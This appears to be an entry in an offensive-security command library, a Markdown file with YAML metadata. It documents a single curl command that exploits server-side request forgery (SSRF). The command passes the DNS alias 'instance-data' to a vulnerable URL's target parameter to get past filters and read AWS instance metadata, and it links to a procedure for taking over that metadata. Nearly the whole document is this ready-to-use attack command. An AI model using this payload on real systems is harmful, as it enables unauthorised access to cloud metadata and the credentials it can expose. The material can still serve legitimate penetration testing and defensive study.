---
type: command
executor: bash
data: 'curl "$_VULN_URL?target=http://instance-data/latest/meta-data/" -v'
output: null
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
  - AWS
tags:
  - ssrf
  - dns-bypass
verified: true
validated: true
---

# curl-alternative-instance-data-urls

## Command

```bash
curl "$_VULN_URL?target=http://instance-data/latest/meta-data/" -v
```

## Description

Uses DNS alias for metadata access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_URL | Vulnerable URL | Yes |

## Examples

### Basic Usage

As shown.

## Expected Output

Metadata listing.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
